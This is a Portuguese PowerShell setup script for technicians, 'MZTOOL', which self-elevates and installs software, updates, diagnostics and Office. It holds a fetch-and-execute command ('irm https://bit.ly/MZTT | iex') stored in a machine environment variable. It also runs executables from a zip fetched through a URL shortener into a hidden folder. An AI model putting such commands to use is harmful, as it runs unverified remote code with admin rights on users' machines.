Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Obtém o ID e o Objeto de Segurança do usuário atual.
$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID)

# Obtém o Objeto de Segurança do usuário Administrador.
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
  
# Verifica se o script está sendo executado como administrador.

if ($myWindowsPrincipal.IsInRole($adminRole)) {
    
    # Executando como administrador. Formatação e estilo aplicadas.

    $Host.UI.RawUI.WindowTitle = 'MZTOOL ⭡'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'
    $H = Get-Host
    $Win = $H.UI.RawUI.WindowSize
    $Win.Height = 20
    $Win.Width = 58
    $H.UI.RawUI.Set_WindowSize($Win)
    
    Clear-Host
}
else {
    
    # Não está executando como administrador.
    
    # Fecha o processo atual e inicia um novo com o script como administrador solicitando UAC.

    $newProcess = New-Object System.Diagnostics.ProcessStartInfo 'PowerShell'
    $newProcess.Arguments = $myInvocation.MyCommand.Definition
    $newProcess.Verb = 'runas'
    [System.Diagnostics.Process]::Start($newProcess) | Out-Null     
    exit

}
  

#MENU MZTOOL -----------------------------------------------------

function DisplayMenu {
    
    Clear-Host
    Write-Host '
______________________________________________________
|                                                    |
|                       MZTOOL                       |
| _________________________________________________  | 
|                                                    | 
|                                                    |
| |1| INSTALAÇÃO COMPLETA                            |
| |2| DIAGNÓSTICO DE HARDWARE E SISTEMA              |
| |3| INSTALAR WINGET & WINDOWS UPDATE               |
| |4| INSTALAR OFFICE                                |
| |0| SAIR                                           |
|                                                    |
|                 MOZART INFORMÁTICA | DANIEL MOZART |
|____________________________________________________|
'
    
    $MENU = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
    Switch ($MENU) {

        1 {
            #OPÇÃO 1 - INSTALAR SOFTWARES E ATUALIZAÇÕES DO SISTEMA.

            Clear-Host
            Write-Host '
    
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| __________________________________________________ | 
|                                                    |
|                     AGUARDE                        |
|                                                    |
|                  EM INSTALAÇÃO                     |
|                                                    |
|                                                    |
|                                 MOZART INFORMÁTICA |
|                                      DANIEL MOZART |
|____________________________________________________|
'            
            Hora
            AnyDesk
            EnvTool
            ToolDir           

            Start-Process powershell -args '-noprofile', '-EncodedCommand',
            ([Convert]::ToBase64String(
                [Text.Encoding]::Unicode.GetBytes(
                    (Get-Command -Type Function RemoveMStorepps, PerfilTheme).Definition
                ))
            )

            Start-Process powershell -args '-noprofile', '-EncodedCommand',
            ([Convert]::ToBase64String(
                [Text.Encoding]::Unicode.GetBytes(
                    (Get-Command -Type Function DownloadMztool, DriverBooster, Office2007).Definition
                ))
            )

            Start-Process powershell -Wait -args '-noprofile', '-EncodedCommand',
            ([Convert]::ToBase64String(
                [Text.Encoding]::Unicode.GetBytes(
                    (Get-Command -Type Function WingetInstall, ModuleUpdate, WinUpdate, WingetInstall).Definition
                ))
            )

            PinIcons

            #DefaultSoftwares

            WingetUpdate
            
            Clear-Host
            Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|                                                    |
|                                                    |
|                                                    |
|      INSTALAÇÃO CONCLUÍDA - ENCERRANDO MZTOOL      |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
            DelTemp
            Start-Sleep -Seconds 5
            Exit
        }

        2 {
    
            #OPÇÃO 2 - DIAGNÓSTICO DE HARDWARE E SISTEMA.
        
            function DisplayMenu2 {
    
                Clear-Host        
                Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|            FERRAMENTAS DE DIAGNÓSTICOS             |
|                                                    |
| |1| ARQUITETURA X64 | 64Bits                       |
| |2| ARQUITETURA X32 | 32Bits                       |
| |3| VOLTAR                                         |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA | DANIEL MOZART |
|____________________________________________________|
'
                $SUBMENU2 = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
                Switch ($SUBMENU2) {
                    1 {
                        Clear-Host
                        Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|            FERRAMENTAS DE DIAGNÓSTICOS             |
|                                                    |
|                                                    |
|     FERRAMENTAS DE DIAGNÓSTICO X64 INICIADAS       |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
                        DownloadMztool
           
                        Diagnostics64

                        Start-Sleep -Seconds 1

                        DelTemp
        
                        DisplayMenu
            
                    }
        
                    2 { 
                        Clear-Host
                        Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|            FERRAMENTAS DE DIAGNÓSTICOS             |
|                                                    |
|                                                    |
|     FERRAMENTAS DE DIAGNÓSTICO X32 INICIADAS       |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
                        DownloadMztool 
                                     
                        Diagnostics32 
                      
                        Start-Sleep -1

                        DelTemp
            
                        DisplayMenu
                    }
        
                    3 {

                        DisplayMenu
                
                    }
        
                    default {
                        #ENTRADA INVÁLIDA.
            
                        Write-Host 'OPÇÃO INVÁLIDA. INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
                        Start-Sleep -Seconds 2
                        DisplayMenu2
                    }
             
                }
                       
            }

            DisplayMenu2
        }

        3 {
            function DisplayMenu3 {
    
                Clear-Host        
                Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|             WINGET & WINDOWS UPDATE                |
|                                                    |
| |1| ISTALAR MÓDULOS WINGET E WINDOWS UPDATE        |
| |2| INSTALAR ATUALIZAÇÕES (MÓDULOS JÁ INSTALADOS)  |
| |3| VOLTAR                                         |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA | DANIEL MOZART |
|____________________________________________________|
'
                $SUBMENU3 = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
                Switch ($SUBMENU3) {
                    1 {
                        Clear-Host
                        Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|             WINGET & WINDOWS UPDATE                |
|                                                    |
|                                                    |
|           INSTALAÇÃO DE MÓDULOS INICIADA           |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
                        ModuleUpdate

                        Start-Sleep -Seconds 1

                        DelTemp
        
                        DisplayMenu
            
                    }
        
                    2 { 
                        Clear-Host
                        Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|             WINGET & WINDOWS UPDATE                |
|                                                    |
|                                                    |
|        INSTALAÇÃO DE ATUALIZAÇÕES INICIADA         |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
                        WingetUpdate

                        WinUpdate 

                        Start-Sleep -1

                        DelTemp
            
                        DisplayMenu
                    }
        
                    3 {

                        DisplayMenu
                
                    }
        
                    default {
                        #ENTRADA INVÁLIDA.
            
                        Write-Host 'OPÇÃO INVÁLIDA. INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
                        Start-Sleep -Seconds 2
                        DisplayMenu3
                    }
             
                }
                       
            }

            DisplayMenu3

        }
       

        4 {

            function DisplayMenu4 {
            
                Clear-Host            
                Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|                 MICROSOFT OFFICE                   |
|                                                    |
|                                                    |
| |1| INSTALAR OFFICE 2007                           | 
| |2| INSTALAR OFFICE 365                            |
| |3| VOLTAR                                         |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
            
       
         
                $SUBMENU4 = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
                switch ($SUBMENU4) {
                    1 { 
                        Clear-Host
                        Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|               MICROSOFT OFFICE 2007                |
|                                                    |
|                                                    |
|                    INSTALANDO                      |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
 '
                               
                        function 2007Folder {

                            $2007Folder = 'C:\TOOL\OFFICE\2007' 
            
                            if (Test-Path -Path $2007Folder) {

                                continue

                            }

                            else {
                
                                ToolDir
                   
                                DownloadMztool
                            }
    
                        }

                        2007Folder

                        Office2007

                        Start-Sleep -1

                        DelTemp
             
                        DisplayMenu
                    }

                    2 {
                        Clear-Host
                        Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|               MICROSOFT OFFICE 365                 |
|                                                    |
|                                                    |
|                    INSTALANDO                      |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'    
                        ModuleUpdate

                        Office365 

                        Start-Sleep -1

                        DelTemp
             
                        DisplayMenu 
                    }

                    3 {

                        DisplayMenu
                
                    }

                    Default {
                        #ENTRADA INVÁLIDA.

                        Write-Host 'OPÇÃO INVÁLIDA. INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
                        Start-Sleep -Seconds 1
                        Clear-Host
                        DisplayMenu4 
                    }
                }

            }
            DisplayMenu4
        } 

        0 {
            #OPÇÃO 0 - ENCERRAR MZTOOL.

            Clear-Host
            Write-Host '
______________________________________________________
|                                                    |
|                      MZTOOL                        |
| _________________________________________________  | 
|                                                    |
|                                                    |
|                                                    |
|                 ENCERRANDO MZTOOL                  |
|                                                    |
|                                                    |
|                 MOZART INFORMÁTICA                 |
|                   DANIEL MOZART                    |
|____________________________________________________|
'
            
            DelTemp
            Start-Sleep -Seconds 3
            Exit
            Exit-PSHostProcess
            Exit-PSSession
        }
        . {
            awin exit
        }

        e {
            EnvTool #TESTAR ENVTOOL
        }

        w {
            WingetInstall #TESTAR WINGET
        }
        default {
            #ENTRADA INVÁLIDA.

            Write-Host 'OPÇÃO INVÁLIDA. INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
            Start-Sleep -Seconds 1
            DisplayMenu
        }
    }
    
}
#FUNÇÕES---------------------------------------------------------------

function Hora {
    
    Start-Process PowerShell {
    
        net start w32time | Out-Null
        w32tm /resync /force | Out-Null
   
    }
}

function ToolDir {

    #Criação do diretório C:\TOOL.

    $TOOL = 'C:\TOOL'
    
    #Se o diretório C:\TOOL já existir, é deletado.

    if (Test-Path -Path $TOOL) {

        Remove-Item -Path $TOOL -Recurse -Force -ErrorAction SilentlyContinue
    }

    [System.IO.Directory]::CreateDirectory($TOOL) | Out-Null
    $TOOLFOLDER = Get-Item $TOOL 
    $TOOLFOLDER.Attributes = 'Hidden' 

}

function DownloadMztool {
     
    #Download do arquivo MZTOOL.zip

    $Host.UI.RawUI.WindowTitle = 'MZTOOL> DOWNLOADMZTOOL'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'
   
    $TOOL = 'C:\TOOL'
    
    $webClient = New-Object -TypeName System.Net.WebClient
    $task = $webClient.DownloadFileTaskAsync('https://seulink.net/TOOLZIP', "$TOOL\MZTOOL.zip")
    
    Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -SourceIdentifier WebClient.DownloadProgressChanged | Out-Null
    
    Start-Sleep -Seconds 3
    
    while (!($task.IsCompleted)) {
        $EventData = Get-Event -SourceIdentifier WebClient.DownloadProgressChanged | Select-Object -ExpandProperty 'SourceEventArgs' -Last 1
    
        $ReceivedData = ($EventData | Select-Object -ExpandProperty 'BytesReceived')
        $TotalToReceive = ($EventData | Select-Object -ExpandProperty 'TotalBytesToReceive')
        $TotalPercent = $EventData | Select-Object -ExpandProperty 'ProgressPercentage'
    
        Start-Sleep -Seconds 2
    
        function convertFileSize {
            param(
                $bytes
            )
    
            if ($bytes -lt 1MB) {
                return "$([Math]::Round($bytes / 1KB, 2)) KB"
            }
            elseif ($bytes -lt 1GB) {
                return "$([Math]::Round($bytes / 1MB, 2)) MB"
            }
            elseif ($bytes -lt 1TB) {
                return "$([Math]::Round($bytes / 1GB, 2)) GB"
            }
        }

        Write-Progress -Activity 'Downloading File' -Status "Percent Complete: $($TotalPercent)%" -CurrentOperation "Downloaded $(convertFileSize -bytes $ReceivedData) / $(convertFileSize -bytes $TotalToReceive)" -PercentComplete $TotalPercent
    
    }
    
    Unregister-Event -SourceIdentifier WebClient.DownloadProgressChanged
    $webClient.Dispose()
    
    #Extração do arquivo MZTOOL.zip para a pasta $TOOL.
    
    Expand-Archive -LiteralPath $TOOL\MZTOOL.zip -DestinationPath $TOOL

    #Deletar o arquivo MZTOOL.zip.

    Remove-Item $TOOL\MZTOOL.zip 
     
}

function EnvTool {
    
    #Adicionar variáveis de ambiente.
    Start-Process PowerShell {
        [Environment]::SetEnvironmentVariable('TOOL', 'C:\TOOL', 'Machine') 
        [Environment]::SetEnvironmentVariable('MZTOOL', 'PowerShell irm https://bit.ly/MZTT | iex', 'MACHINE')
    }
}


function Diagnostics64 {
   
    $TOOL = 'C:\TOOL\MZTOOL'

    Start-Process $TOOL\AIDA_64\aida64.exe
    Start-Process $TOOL\BLUE_SCREEN_VIEW\BlueScreenView.exe
    Start-Process $TOOL\CORE_TEMP\Core_Temp_64.exe
    Start-Process $TOOL\CPU_Z\cpuz_x64.exe
    Start-Process $TOOL\CRYSTAL_DISK\DiskInfo64.exe
    Start-Process $TOOL\HDSENTINEL\HDSentinel.exe
    Start-Process $TOOL\HWINFO\HWiNFO64.exe
    Start-Process $TOOL\GPU_Z.exe

    Clear-Host
        
}

function Diagnostics32 {

    $TOOL = 'C:\TOOL\MZTOOL'
              
    Start-Process $TOOL\AIDA_64\aida64.exe
    Start-Process $TOOL\BLUE_SCREEN_VIEW\BlueScreenView.exe
    Start-Process $TOOL\CORE_TEMP\Core_Temp_32.exe
    Start-Process $TOOL\CPU_Z\cpuz_x32.exe
    Start-Process $TOOL\CRYSTAL_DISK\DiskInfo32.exe
    Start-Process $TOOL\HDSENTINEL\HDSentinel.exe
    Start-Process $TOOL\HWINFO\HWiNFO32.exe
    Start-Process $TOOL\GPU_Z.exe

    Clear-Host
        
}


function ModuleUpdate {

    
    #INSTALAÇÃO DOS MÓDULOS WINGET E WINDOWS UPDATE.       
    
    $Host.UI.RawUI.WindowTitle = 'MZTOOL> MODULESUPDATE'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

    function WaitOffice2007Modules {
            
        if (Get-Process -Name setup -ErrorAction SilentlyContinue) {
            Wait-Process -Name setup
        }

           
    }
    
    #Pacote NuGet.
    Install-PackageProvider -Name NuGet -Force
        
    #Módulo WINGET.
    Install-Module -Name Microsoft.WinGet.Client -Force -Repository PSGallery 
    Repair-WinGetPackageManager
    Winget Source Remove --Name winget
    Winget Source Remove --Name msstore
    Remove-Item -Path $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue 
    Start-BitsTransfer -Source 'https://cdn.winget.microsoft.com/cache/source.msix' -Destination "$env:TEMP\source.msix"
    Add-AppPackage -Path "$env:TEMP\source.msix"
    Start-BitsTransfer -Source 'https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle'-Destination "$env:TEMP\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle"
    Add-AppPackage -Path "$env:TEMP\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle"  
    Start-Sleep 1
    Winget Source Reset --Force     
    Winget Source Update   
    Winget Upgrade Microsoft.AppInstaller --Accept-Source-Agreements --Accept-Package-Agreements
    Start-Sleep 1

    #Módulo WINDOWS UPDATE.
    Install-Module PSWindowsUpdate -AllowClobber -Force
    Import-Module PSWindowsUpdate -Force       
    
    #WINGET UPGRADE ALL
    WaitOffice2007Modules
    Winget Upgrade --All --Accept-Source-Agreements --Accept-Package-Agreements

    Clear-Host
             
}

function WingetInstall {
    
    #WINGET - Instalação dos softwares Acrobat Reader, Google Chrome, Microsoft Powershell 7+.

    Start-Process PowerShell {

        $Host.UI.RawUI.WindowTitle = 'MZTOOL> WINGET'
        $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

        function WaitOffice2007Winget {
            
            if (Get-Process -Name setup -ErrorAction SilentlyContinue) {
                Wait-Process -Name setup
            }

           
        }
        
        for ($i = 0; $i -le 2; $i++) {

            WaitOffice2007Winget
        
            Start-BitsTransfer -Source 'https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle'-Destination "$env:TEMP\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle"
            Add-AppPackage -Path "$env:TEMP\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle"
            
            WaitOffice2007Winget
        
            Winget Install --Id Adobe.Acrobat.Reader.64-bit --Source winget --Accept-Source-Agreements --Accept-Package-Agreements

            WaitOffice2007Winget
        
            Winget Install --Id Google.Chrome.EXE --Accept-Source-Agreements --Accept-Package-Agreements

            WaitOffice2007Winget
        
            Winget Install --Id Microsoft.Powershell --Accept-Source-Agreements --Accept-Package-Agreements
                        
            Clear-Host
            
        }        
       
        
    }
      
}
function WingetUpdate { 

    #WINGET - Atualização de pacotes de softwares instalados.

    Start-Process PowerShell {

        $Host.UI.RawUI.WindowTitle = 'MZTOOL> WINGETUPDATE'
        $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

        Winget Upgrade --All --Accept-Source-Agreements --Accept-Package-Agreements --Include-Unknown

        Clear-Host
    }
}

function WinUpdate { 
   
    #Instalação de novas atualizações do Windows através do Windows Update.
    
    Start-Process PowerShell {

        $Host.UI.RawUI.WindowTitle = 'MZTOOL> WINUPDATE'
        $Host.UI.RawUI.BackgroundColor = 'DarkBlue'
    
        Get-WindowsUpdate -Download -Install -AcceptAll -ForceInstall -IgnoreReboot

        Clear-Host
    }  
}

function AnyDesk {

    #Download do software AnyDek-CM.

    Start-Process PowerShell {
        Start-BitsTransfer -Source 'https://download.anydesk.com/AnyDesk-CM.exe' -Destination "$home\Desktop\AnyDesk.exe"
        #Invoke-WebRequest -Uri 'https://download.anydesk.com/AnyDesk-CM.exe' -OutFile "$home\Desktop\AnyDesk.exe"
    
    }
}

function Office365 {

    $Host.UI.RawUI.WindowTitle = 'MZTOOL> OFFICE365'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

    $TOOL = 'C:\TOOL'

    [xml]$XML = @'
<Configuration ID="646616bb-84c9-4354-9908-8abd74c04f4c">
  <Add OfficeClientEdition="64" Channel="Current" MigrateArch="TRUE">
    <Product ID="O365ProPlusEEANoTeamsRetail">
      <Language ID="pt-br" />
      <Language ID="MatchPreviousMSI" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
    </Product>
  </Add>
  <Updates Enabled="TRUE" />
  <RemoveMSI />
  <AppSettings>
    <User Key="software\microsoft\office\16.0\excel\options" Name="defaultformat" Value="60" Type="REG_DWORD" App="excel16" Id="L_SaveExcelfilesas" />
    <User Key="software\microsoft\office\16.0\powerpoint\options" Name="defaultformat" Value="52" Type="REG_DWORD" App="ppt16" Id="L_SavePowerPointfilesas" />
    <User Key="software\microsoft\office\16.0\word\options" Name="defaultformat" Value="ODT" Type="REG_SZ" App="word16" Id="L_SaveWordfilesas" />
    <User Key="software\microsoft\office\16.0\word\options" Name="verticalruler" Value="1" Type="REG_DWORD" App="word16" Id="L_VerticalrulerPrintviewonly" />
  </AppSettings>
  <Display Level="Full" AcceptEULA="TRUE" />
</Configuration> 
'@
    $365 = "$TOOL\OFFICE\365"
    
    #Se o diretório $Env:TOOL\OFFICE\365 já existir, é deletado.

    if ($TOOL) {

        Remove-Item -Path "$TOOL"-Recurse -Force -ErrorAction SilentlyContinue
    }

    [System.IO.Directory]::CreateDirectory($365) | Out-Null
    $TOOLFOLDER = Get-Item $TOOL 
    $TOOLFOLDER.Attributes = 'Hidden'  
    
    $XML.save("$TOOL\OFFICE\365\OFFICE365.xml") 
   
    $365XML = "$TOOL\OFFICE\365\OFFICE365.xml"

    Winget Install --Id Microsoft.Office --Override "/configure $365XML" --Accept-Source-Agreements --Accept-Package-Agreements
    
    Clear-Host
}
    
function Office2007 {

    $Host.UI.RawUI.WindowTitle = 'MZTOOL> OFFICE2007'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'
    function WaitOffice2007B {
            
        if (Get-Process -Name setup -ErrorAction SilentlyContinue) {
            Wait-Process -Name setup
        }
    
    }
    
    $TOOL = 'C:\TOOL'

    Start-Process "$TOOL\OFFICE\2007\Setup.exe" -ArgumentList '/adminfile Silent.msp'
   
    Add-WindowsCapability –Online -Name NetFx3~~~~ –Source D:\sources\sxs

    WaitOffice2007B
    
    Start-Process 'winword.exe'
   
}

function DriverBooster {
    #Extração e inicialização do software Driver Booster.

    Start-Process PowerShell {
    
        $Host.UI.RawUI.WindowTitle = 'MZTOOL> DRIVER_BOOSTER'
        $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

        $TOOL = 'C:\TOOL'

        Expand-Archive -LiteralPath "$TOOL\MZTOOL\DRIVER_BOOSTER.zip" -DestinationPath "$TOOL\MZTOOL\DRIVER_BOOSTER"

        Start-Process "$TOOL\MZTOOL\DRIVER_BOOSTER\DriverBoosterPortable.exe" -Wait
        
        Start-Sleep -Seconds 1
        #Finaliza os serviços do software Driver Booster e deleta a pasta temporária do mesmo.
        function StopDriverBooster {
            
            if (Get-Process -Name 'DriverBooster'-ErrorAction SilentlyContinue ) {
                
                Stop-Process -Name 'DriverBooster' -Force

                if (Get-Process -Name 'ScanWinUpd'-ErrorAction SilentlyContinue) {
                
                    Stop-Process -Name 'ScanWinUpd' -Force
                }
                
                Start-Sleep -Seconds 5

                Remove-Item -Path "$TOOL\MZTOOL\DRIVER_BOOSTER" -Recurse -Force -ErrorAction SilentlyContinue
            }

            elseif (Get-Process -Name 'ScanWinUpd'-ErrorAction SilentlyContinue) {
                
                Stop-Process -Name 'ScanWinUpd' -Force

                if (Get-Process -Name 'DriverBooster'-ErrorAction SilentlyContinue ) {
                
                    Stop-Process -Name 'DriverBooster' -Force
                }
                
                Start-Sleep -Seconds 5

                Remove-Item -Path "$TOOL\MZTOOL\DRIVER_BOOSTER" -Recurse -Force -ErrorAction SilentlyContinue
            }

            else {
                
                continue
            }
    
        }

        StopDriverBooster

        Clear-Host
    }
}

function RemoveMStorepps {

    Start-Process PowerShell {

        $Host.UI.RawUI.WindowTitle = 'MZTOOL> REMOVEMSTOREAPPS'
        $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

        #Remove aplicativos específicados do Windows Store.
        Get-AppxPackage -AllUsers *WebExperience* | Remove-AppxPackage #Remover Widgets.
        Get-AppxPackage -AllUsers *3dbuilder* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *feedback* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *officehub* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *getstarted* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *skypeapp* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *zunemusic* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *zune* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *messaging* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *solitaire* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *wallet* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *connectivitystore* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *bingfinance* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *bing* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *zunevideo* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *bingnews* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *mspaint* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *commsphone* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *windowsphone* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *phone* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *bingsports* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *bingweather* | Remove-AppxPackage
        Get-AppxPackage -AllUsers *xbox* | Remove-AppxPackage
        Get-AppxPackage -AllUsers -PackageTypeFilter Bundle *xbox* | Where-Object SignatureKind -NE 'System' | Remove-AppxPackage -AllUsers
        Get-AppxPackage -AllUsers *WebExperience* | Remove-AppxPackage

        $app_packages = 
        'Clipchamp.Clipchamp',
        'Microsoft.549981C3F5F10', #Cortana
        'Microsoft.WindowsFeedbackHub',
        'microsoft.windowscommunicationsapps',
        'Microsoft.WindowsMaps',
        'Microsoft.ZuneMusic',
        'Microsoft.BingNews',
        'Microsoft.Todos',
        'Microsoft.ZuneVideo',
        'Microsoft.MicrosoftOfficeHub',
        'Microsoft.OutlookForWindows',
        'Microsoft.People',
        'Microsoft.PowerAutomateDesktop',
        'MicrosoftCorporationII.QuickAssist',
        'Microsoft.ScreenSketch',
        'Microsoft.MicrosoftSolitaireCollection',
        'Microsoft.BingWeather',
        'Microsoft.Xbox.TCUI',
        'Microsoft.GamingApp'

        Get-AppxPackage -AllUsers | Where-Object { $_.name -in $app_packages } | Remove-AppxPackage -AllUsers

    }
}
function PerfilTheme {

    $Host.UI.RawUI.WindowTitle = 'MZTOOL> PERFILTHEME'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

    $WinVer = (Get-WmiObject Win32_OperatingSystem).Caption

    #Adiciona o Tema Escuro ao Windows.

    if ( $WinVer -Match 'Windows 11') {
        Write-Host "$WinVer"
        Start-Process -FilePath 'C:\Windows\Resources\Themes\dark.theme'
    }

    elseif ($WinVer -Match 'Windows 10') {
        Write-Host "$WinVer"
        Start-Process -FilePath 'C:\Windows\Resources\Themes\aero.theme'
    }

    else {
        Write-Host 'Windows não identificado, tema não aplicado.'
    }    
    
    #Adiciona ícones de sistema a Área de Trabalho.

    $DESKINCONSREG = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel'

    #New-ItemProperty -Path "$DESKINCONSREG" -Name '{018D5C66-4533-4307-9B53-224DE2ED1FE6}' -PropertyType dword -Value 00000000 LIXEIRAICON
    New-ItemProperty -Path "$DESKINCONSREG" -Name '{20D04FE0-3AEA-1069-A2D8-08002B30309D}' -PropertyType dword -Value 00000000
    New-ItemProperty -Path "$DESKINCONSREG" -Name '{59031a47-3f72-44a7-89c5-5595fe6b30ee}' -PropertyType dword -Value 00000000
    New-ItemProperty -Path "$DESKINCONSREG" -Name '{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}' -PropertyType dword -Value 00000000
    New-ItemProperty -Path "$DESKINCONSREG" -Name '{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}' -PropertyType dword -Value 00000000

    #Mostra e atualiza a Área de Trabalho.
    
    for ($i = 0; $i -le 2; $i++) {
        (New-Object -ComObject shell.application).toggleDesktop()
        Start-Sleep 2
        (New-Object -ComObject Wscript.Shell).sendkeys('{F5}')
        Start-Sleep 1
        (New-Object -ComObject shell.application).undominimizeall()
    }

    #Finaliza janela de personalização do Windows.

    if (Get-Process -Name 'systemsettings') {
                        
        Stop-Process -Name 'systemsettings' -Force
    }

    else {
        continue
    }      
    
    Clear-Host

}

function PinIcons {

    $Host.UI.RawUI.WindowTitle = 'MZTOOL> PERFILTHEME > PINICONS'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'

    #Fixar ícones de softwares Google Chrome, Acrobat Reader, Microsoft Word na barra de tarefas.

    $taskbar_layout =
    @'
<?xml version="1.0" encoding="utf-8"?>
<LayoutModificationTemplate
    xmlns="http://schemas.microsoft.com/Start/2014/LayoutModification"
    xmlns:defaultlayout="http://schemas.microsoft.com/Start/2014/FullDefaultLayout"
    xmlns:start="http://schemas.microsoft.com/Start/2014/StartLayout"
    xmlns:taskbar="http://schemas.microsoft.com/Start/2014/TaskbarLayout"
    Version="1">
  <CustomTaskbarLayoutCollection PinListPlacement="Replace">
    <defaultlayout:TaskbarLayout>
      <taskbar:TaskbarPinList>
        <taskbar:DesktopApp DesktopApplicationID="Microsoft.Windows.Explorer" />
        <taskbar:DesktopApp DesktopApplicationID="Chrome" />
        <taskbar:DesktopApp DesktopApplicationID="{6D809377-6AF0-444B-8957-A3773F02200E}\Adobe\Acrobat DC\Acrobat\Acrobat.exe" />
        <taskbar:DesktopApp DesktopApplicationID="{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}\Microsoft Office\Office12\WINWORD.EXE" />
      </taskbar:TaskbarPinList>
    </defaultlayout:TaskbarLayout>
 </CustomTaskbarLayoutCollection>
</LayoutModificationTemplate>
'@

    
    [System.IO.FileInfo]$provisioning = "$($env:TOOL)\TASKLAYOUT.xml"
    if (!$provisioning.Directory.Exists) {
        $provisioning.Directory.Create()
    }

    $taskbar_layout | Out-File $provisioning.FullName -Encoding utf8

    $settings = [PSCustomObject]@{
        Path  = 'SOFTWARE\Policies\Microsoft\Windows\Explorer'
        Value = $provisioning.FullName
        Name  = 'StartLayoutFile'
        Type  = [Microsoft.Win32.RegistryValueKind]::ExpandString
    },
    [PSCustomObject]@{
        Path  = 'SOFTWARE\Policies\Microsoft\Windows\Explorer'
        Value = 1
        Name  = 'LockedStartLayout'
    } | Group-Object Path

